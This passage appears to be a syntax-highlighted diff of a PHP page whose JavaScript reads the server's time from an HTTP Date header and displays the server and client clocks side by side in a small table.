+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">var</span><span class="w"> </span><span class="n">xmlHttp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//获取服务器时间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">xmlHttp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">ActiveXObject</span><span class="p">(</span><span class="err">&#34;</span><span class="n">Msxml2</span><span class="p">.</span><span class="n">XMLHTTP</span><span class="err">&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">xmlHttp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">ActiveXObject</span><span class="p">(</span><span class="err">&#34;</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">XMLHTTP</span><span class="err">&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">e2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">xmlHttp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">xmlHttp</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">typeof</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">undefined</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">xmlHttp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xmlHttp</span><span class="p">.</span><span class="n">open</span><span class="p">(</span><span class="err">&#34;</span><span class="n">GET</span><span class="err">&#34;</span><span class="p">,</span><span class="w"> </span><span class="err">&#34;</span><span class="n">null</span><span class="p">.</span><span class="n">txt</span><span class="err">&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">false</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xmlHttp</span><span class="p">.</span><span class="n">setRequestHeader</span><span class="p">(</span><span class="err">&#34;</span><span class="n">Range</span><span class="err">&#34;</span><span class="p">,</span><span class="w"> </span><span class="err">&#34;</span><span class="n">bytes</span><span class="o">=-</span><span class="err">1&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xmlHttp</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">severtime</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">Date</span><span class="p">(</span><span class="n">xmlHttp</span><span class="p">.</span><span class="n">getResponseHeader</span><span class="p">(</span><span class="err">&#34;</span><span class="n">Date</span><span class="err">&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//获取服务器日期
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">var</span><span class="w"> </span><span class="n">year</span><span class="o">=</span><span class="n">severtime</span><span class="p">.</span><span class="n">getFullYear</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">month</span><span class="o">=</span><span class="n">severtime</span><span class="p">.</span><span class="n">getMonth</span><span class="p">()</span><span class="o">+</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">date</span><span class="o">=</span><span class="n">severtime</span><span class="p">.</span><span class="n">getDate</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//获取服务器时间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">var</span><span class="w"> </span><span class="n">hour</span><span class="o">=</span><span class="n">severtime</span><span class="p">.</span><span class="n">getHours</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">minu</span><span class="o">=</span><span class="n">severtime</span><span class="p">.</span><span class="n">getMinutes</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">seco</span><span class="o">=</span><span class="n">severtime</span><span class="p">.</span><span class="n">getSeconds</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//获取客户端时间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">localtime</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">Date</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//取得时间差
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">var</span><span class="w"> </span><span class="n">jtime</span><span class="o">=</span><span class="n">Math</span><span class="p">.</span><span class="n">abs</span><span class="p">(</span><span class="n">localtime</span><span class="p">.</span><span class="n">getTime</span><span class="p">()</span><span class="o">-</span><span class="n">severtime</span><span class="p">.</span><span class="n">getTime</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">jdate</span><span class="o">=</span><span class="nn">jtime/</span><span class="p">(</span><span class="err">24</span><span class="o">*</span><span class="err">60</span><span class="o">*</span><span class="err">60</span><span class="o">*</span><span class="err">1000</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">jhour</span><span class="o">=</span><span class="n">jtime</span><span class="o">%</span><span class="p">(</span><span class="err">24</span><span class="o">*</span><span class="err">60</span><span class="o">*</span><span class="err">60</span><span class="o">*</span><span class="err">1000</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="err">60</span><span class="o">*</span><span class="err">60</span><span class="o">*</span><span class="err">1000</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">jminu</span><span class="o">=</span><span class="n">jtime</span><span class="o">%</span><span class="p">(</span><span class="err">24</span><span class="o">*</span><span class="err">60</span><span class="o">*</span><span class="err">60</span><span class="o">*</span><span class="err">1000</span><span class="p">)</span><span class="o">%</span><span class="p">(</span><span class="err">60</span><span class="o">*</span><span class="err">60</span><span class="o">*</span><span class="err">1000</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="err">60</span><span class="o">*</span><span class="err">1000</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">jsecond</span><span class="o">=</span><span class="n">jtime</span><span class="o">%</span><span class="p">(</span><span class="err">24</span><span class="o">*</span><span class="err">60</span><span class="o">*</span><span class="err">60</span><span class="o">*</span><span class="err">1000</span><span class="p">)</span><span class="o">%</span><span class="p">(</span><span class="err">60</span><span class="o">*</span><span class="err">60</span><span class="o">*</span><span class="err">1000</span><span class="p">)</span><span class="o">%</span><span class="p">(</span><span class="err">60</span><span class="o">*</span><span class="err">1000</span><span class="p">)</span><span class="o">/</span><span class="err">1000</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//格式化输出客户端时间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">function</span><span class="w"> </span><span class="n">getClientTime</span><span class="p">(){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">localtime</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">Date</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">cyear</span><span class="o">=</span><span class="n">localtime</span><span class="p">.</span><span class="n">getFullYear</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">cmonth</span><span class="o">=</span><span class="n">localtime</span><span class="p">.</span><span class="n">getMonth</span><span class="p">()</span><span class="o">+</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">cdate</span><span class="o">=</span><span class="n">localtime</span><span class="p">.</span><span class="n">getDate</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">chour</span><span class="o">=</span><span class="n">localtime</span><span class="p">.</span><span class="n">getHours</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">cminu</span><span class="o">=</span><span class="n">localtime</span><span class="p">.</span><span class="n">getMinutes</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">cseco</span><span class="o">=</span><span class="n">localtime</span><span class="p">.</span><span class="n">getSeconds</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ccyear</span><span class="o">=</span><span class="n">addZero</span><span class="p">(</span><span class="n">cyear</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ccmonth</span><span class="o">=</span><span class="n">addZero</span><span class="p">(</span><span class="n">cmonth</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ccdate</span><span class="o">=</span><span class="n">addZero</span><span class="p">(</span><span class="n">cdate</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cchour</span><span class="o">=</span><span class="n">addZero</span><span class="p">(</span><span class="n">chour</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ccminu</span><span class="o">=</span><span class="n">addZero</span><span class="p">(</span><span class="n">cminu</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ccseco</span><span class="o">=</span><span class="n">addZero</span><span class="p">(</span><span class="n">cseco</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">document</span><span class="p">.</span><span class="n">getElementById</span><span class="p">(</span><span class="err">&#34;</span><span class="n">clienttime</span><span class="err">&#34;</span><span class="p">).</span><span class="n">innerHTML</span><span class="o">=</span><span class="n">ccyear</span><span class="o">+</span><span class="err">&#34;</span><span class="o">-</span><span class="err">&#34;</span><span class="o">+</span><span class="n">ccmonth</span><span class="o">+</span><span class="err">&#34;</span><span class="o">-</span><span class="err">&#34;</span><span class="o">+</span><span class="n">ccdate</span><span class="o">+</span><span class="err">&#34;</span><span class="w"> </span><span class="err">&#34;</span><span class="o">+</span><span class="n">cchour</span><span class="o">+</span><span class="err">&#34;</span><span class="o">:</span><span class="err">&#34;</span><span class="o">+</span><span class="n">ccminu</span><span class="o">+</span><span class="err">&#34;</span><span class="o">:</span><span class="err">&#34;</span><span class="o">+</span><span class="n">ccseco</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">document</span><span class="p">.</span><span class="n">getElementById</span><span class="p">(</span><span class="err">&#34;</span><span class="n">ctime</span><span class="err">&#34;</span><span class="p">).</span><span class="n">value</span><span class="o">=</span><span class="w"> </span><span class="n">ccmonth</span><span class="o">+</span><span class="err">&#34;&#34;</span><span class="o">+</span><span class="n">ccdate</span><span class="o">+</span><span class="err">&#34;&#34;</span><span class="o">+</span><span class="n">cchour</span><span class="o">+</span><span class="err">&#34;&#34;</span><span class="o">+</span><span class="n">ccminu</span><span class="o">+</span><span class="err">&#34;&#34;</span><span class="o">+</span><span class="n">ccyear</span><span class="o">+</span><span class="err">&#34;</span><span class="p">.</span><span class="err">&#34;</span><span class="o">+</span><span class="n">ccseco</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//格式化输出服务器时间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">function</span><span class="w"> </span><span class="n">getSeverTime</span><span class="p">(){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">seco</span><span class="o">++</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">if</span><span class="p">(</span><span class="n">seco</span><span class="o">==</span><span class="err">60</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">minu</span><span class="o">+=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">seco</span><span class="o">=</span><span class="err">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">if</span><span class="p">(</span><span class="n">minu</span><span class="o">==</span><span class="err">60</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">hour</span><span class="o">+=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">minu</span><span class="o">=</span><span class="err">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">if</span><span class="p">(</span><span class="n">hour</span><span class="o">==</span><span class="err">24</span><span class="p">){</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">date</span><span class="o">+=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">hour</span><span class="o">=</span><span class="err">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//日期处理
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">if</span><span class="p">(</span><span class="n">month</span><span class="o">==</span><span class="err">1</span><span class="o">||</span><span class="n">month</span><span class="o">==</span><span class="err">3</span><span class="o">||</span><span class="n">month</span><span class="o">==</span><span class="err">5</span><span class="o">||</span><span class="n">month</span><span class="o">==</span><span class="err">7</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">||</span><span class="n">month</span><span class="o">==</span><span class="err">8</span><span class="o">||</span><span class="n">month</span><span class="o">==</span><span class="err">10</span><span class="o">||</span><span class="n">month</span><span class="o">==</span><span class="err">12</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">if</span><span class="p">(</span><span class="n">date</span><span class="o">==</span><span class="err">32</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">date</span><span class="o">=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">month</span><span class="o">+=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="n">else</span><span class="w"> </span><span class="n">if</span><span class="p">(</span><span class="n">month</span><span class="o">==</span><span class="err">4</span><span class="o">||</span><span class="n">month</span><span class="o">==</span><span class="err">6</span><span class="o">||</span><span class="n">month</span><span class="o">==</span><span class="err">9</span><span class="o">||</span><span class="n">month</span><span class="o">==</span><span class="err">11</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">if</span><span class="p">(</span><span class="n">date</span><span class="o">==</span><span class="err">31</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">date</span><span class="o">=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">month</span><span class="o">+=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="n">else</span><span class="w"> </span><span class="n">if</span><span class="p">(</span><span class="n">month</span><span class="o">==</span><span class="err">2</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">if</span><span class="p">(</span><span class="n">year</span><span class="o">%</span><span class="err">4</span><span class="o">==</span><span class="err">0</span><span class="o">&amp;&amp;</span><span class="n">year</span><span class="o">%</span><span class="err">100</span><span class="o">!=</span><span class="err">0</span><span class="p">){</span><span class="c1">//闰年处理
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">if</span><span class="p">(</span><span class="n">date</span><span class="o">==</span><span class="err">29</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="n">date</span><span class="o">=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="n">month</span><span class="o">+=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="p">}</span><span class="n">else</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">if</span><span class="p">(</span><span class="n">date</span><span class="o">==</span><span class="err">28</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="n">date</span><span class="o">=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="n">month</span><span class="o">+=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">if</span><span class="p">(</span><span class="n">month</span><span class="o">==</span><span class="err">13</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">year</span><span class="o">+=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">month</span><span class="o">=</span><span class="err">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">sseco</span><span class="o">=</span><span class="n">addZero</span><span class="p">(</span><span class="n">seco</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">sminu</span><span class="o">=</span><span class="n">addZero</span><span class="p">(</span><span class="n">minu</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">shour</span><span class="o">=</span><span class="n">addZero</span><span class="p">(</span><span class="n">hour</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">sdate</span><span class="o">=</span><span class="n">addZero</span><span class="p">(</span><span class="n">date</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">smonth</span><span class="o">=</span><span class="n">addZero</span><span class="p">(</span><span class="n">month</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">syear</span><span class="o">=</span><span class="n">year</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">document</span><span class="p">.</span><span class="n">getElementById</span><span class="p">(</span><span class="err">&#34;</span><span class="n">servertime</span><span class="err">&#34;</span><span class="p">).</span><span class="n">innerHTML</span><span class="o">=</span><span class="n">syear</span><span class="o">+</span><span class="err">&#34;</span><span class="o">-</span><span class="err">&#34;</span><span class="o">+</span><span class="n">smonth</span><span class="o">+</span><span class="err">&#34;</span><span class="o">-</span><span class="err">&#34;</span><span class="o">+</span><span class="n">sdate</span><span class="o">+</span><span class="err">&#34;</span><span class="w"> </span><span class="err">&#34;</span><span class="o">+</span><span class="n">shour</span><span class="o">+</span><span class="err">&#34;</span><span class="o">:</span><span class="err">&#34;</span><span class="o">+</span><span class="n">sminu</span><span class="o">+</span><span class="err">&#34;</span><span class="o">:</span><span class="err">&#34;</span><span class="o">+</span><span class="n">sseco</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">setTimeout</span><span class="p">(</span><span class="err">&#34;</span><span class="n">getSeverTime</span><span class="p">()</span><span class="err">&#34;</span><span class="p">,</span><span class="err">1000</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">setTimeout</span><span class="p">(</span><span class="err">&#34;</span><span class="n">getClientTime</span><span class="p">()</span><span class="err">&#34;</span><span class="p">,</span><span class="err">100</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">function</span><span class="w"> </span><span class="n">addZero</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">num</span><span class="o">=</span><span class="n">Math</span><span class="p">.</span><span class="n">floor</span><span class="p">(</span><span class="n">num</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">return</span><span class="w"> </span><span class="p">((</span><span class="n">num</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="err">9</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="p">(</span><span class="err">&#34;0&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">num</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">num</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">function</span><span class="w"> </span><span class="n">updatetime</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">return</span><span class="w"> </span><span class="n">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">body</span><span class="w"> </span><span class="n">onLoad</span><span class="o">=</span><span class="err">&#34;</span><span class="n">getSeverTime</span><span class="p">();</span><span class="err">&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">table</span><span class="w"> </span><span class="n">style</span><span class="o">=</span><span class="err">&#39;</span><span class="n">width</span><span class="o">:</span><span class="err">500</span><span class="n">px</span><span class="err">&#39;</span><span class="w"> </span><span class="n">border</span><span class="o">=</span><span class="err">&#39;0&#39;</span><span class="w"> </span><span class="n">align</span><span class="o">=</span><span class="err">&#39;</span><span class="n">center</span><span class="err">&#39;</span><span class="w"> </span><span class="n">cellpadding</span><span class="o">=</span><span class="err">&#39;3&#39;</span><span class="w"> </span><span class="n">cellspacing</span><span class="o">=</span><span class="err">&#39;1&#39;</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">th</span><span class="w"> </span><span class="n">colspan</span><span class="o">=</span><span class="err">&#34;2&#34;</span><span class="o">&gt;&lt;?</span><span class="n">php</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="n">lang_get</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Timer</span><span class="err">&#39;</span><span class="p">);</span><span class="w"> </span><span class="o">?&gt;&lt;/</span><span class="n">th</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">tr</span><span class="w"> </span><span class="o">&gt;&lt;</span><span class="n">td</span><span class="w"> </span><span class="n">align</span><span class="o">=</span><span class="err">&#39;</span><span class="n">right</span><span class="err">&#39;</span><span class="w"> </span><span class="n">width</span><span class="o">=</span><span class="err">50</span><span class="o">%&gt;&lt;?</span><span class="n">php</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="n">lang_get</span><span class="p">(</span><span class="err">&#39;</span><span class="n">System</span><span class="w"> </span><span class="n">time</span><span class="err">&#39;</span><span class="p">)</span><span class="o">?&gt;&lt;/</span><span class="n">td</span><span class="o">&gt;&lt;</span><span class="n">td</span><span class="w"> </span><span class="n">align</span><span class="o">=</span><span class="err">&#39;</span><span class="n">left</span><span class="err">&#39;</span><span class="o">&gt;&lt;</span><span class="n">div</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="err">&#34;</span><span class="n">servertime</span><span class="err">&#34;</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;/</span><span class="n">td</span><span class="o">&gt;&lt;/</span><span class="n">tr</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">tr</span><span class="w"> </span><span class="o">&gt;&lt;</span><span class="n">td</span><span class="w"> </span><span class="n">align</span><span class="o">=</span><span class="err">&#39;</span><span class="n">right</span><span class="err">&#39;</span><span class="o">&gt;&lt;?</span><span class="n">php</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="n">lang_get</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Client</span><span class="w"> </span><span class="n">time</span><span class="err">&#39;</span><span class="p">)</span><span class="o">?&gt;&lt;/</span><span class="n">td</span><span class="o">&gt;&lt;</span><span class="n">td</span><span class="w"> </span><span class="n">align</span><span class="o">=</span><span class="err">&#39;</span><span class="n">left</span><span class="err">&#39;</span><span class="o">&gt;&lt;</span><span class="n">div</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="err">&#34;</span><span class="n">clienttime</span><span class="err">&#34;</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;/</span><span class="n">td</span><span class="o">&gt;&lt;/</span><span class="n">tr</span><span class="o">&gt;</span><span class="w">
